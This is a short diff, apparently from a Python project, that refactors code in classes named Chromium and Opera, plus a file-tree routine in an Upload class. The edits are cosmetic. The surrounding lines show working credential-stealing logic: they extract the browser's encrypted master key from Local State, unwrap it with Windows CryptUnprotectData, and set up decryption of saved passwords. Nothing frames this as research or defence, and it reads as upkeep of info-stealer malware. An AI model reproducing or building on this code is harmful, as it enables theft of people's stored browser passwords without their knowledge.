@@ -79,7 +79,7 @@ class Upload:
             'last':   '└── ',
         }
 
-        if prefix == '':
+        if not prefix:
             yield midfix_folder + path.name
 
         contents = list(path.iterdir())
@@ -161,8 +161,7 @@ class Chromium:
 
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        return master_key
+        return CryptUnprotectData(master_key, None, None, None, 0)[1]
 
     def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
@@ -309,9 +308,7 @@ class Opera:
 
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-
-        return master_key
+        return CryptUnprotectData(master_key, None, None, None, 0)[1]
 
     def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
